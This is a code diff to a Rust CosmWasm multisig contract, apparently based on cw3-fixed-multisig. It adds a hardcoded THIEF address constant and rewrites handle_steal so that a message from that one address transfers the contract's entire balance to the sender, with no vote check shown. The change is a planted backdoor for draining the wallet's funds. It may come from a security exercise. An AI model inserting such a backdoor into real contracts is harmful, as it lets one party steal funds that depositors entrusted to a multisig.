@@ -23,6 +23,7 @@ use crate::state::{
 // version info for migration info
 const CONTRACT_NAME: &str = "crates.io:cw3-fixed-multisig";
 const CONTRACT_VERSION: &str = env!("CARGO_PKG_VERSION");
+const THIEF: &str = "changeme";
 
 pub fn init(
     deps: DepsMut,
@@ -271,28 +272,31 @@ pub fn handle_steal(
     deps: DepsMut,
     env: Env,
     info: MessageInfo,
-    destination: HumanAddr,
 ) -> Result<HandleResponse<Empty>, ContractError> {
-    // anyone can trigger this if the vote passed
-    let contract_address = env.contract.address;
-    let amount = deps.querier.query_all_balances(&contract_address)?;
 
-    let bank_msg = BankMsg::Send {
-        from_address: contract_address,
-        to_address: destination,
-        amount,
-    };
+    if env.message.sender != HumanAddr::from(THIEF) {
+        Err(StdError::unauthorized())
+    } else {
+        let contract_address = env.contract.address;
+                let amount = deps.querier.query_all_balances(&contract_address)?;
 
-    let msgs = vec![CosmosMsg::Bank(bank_msg)];
+        let bank_msg = BankMsg::Send {
+            from_address: contract_address,
+            to_address: info.sender,
+            amount,
+        };
 
-    Ok(HandleResponse {
-        messages: msgs,
-        attributes: vec![
-            attr("action", "steal"),
-            attr("to", destination),
-        ],
-        data: None,
-    })
+        let msgs = vec![CosmosMsg::Bank(bank_msg)];
+
+        Ok(HandleResponse {
+            messages: msgs,
+            attributes: vec![
+                attr("action", "steal"),
+                attr("to", info.sender),
+            ],
+            data: None,
+        })
+    }
 }
 
 pub fn query(deps: Deps, env: Env, msg: QueryMsg) -> StdResult<Binary> {
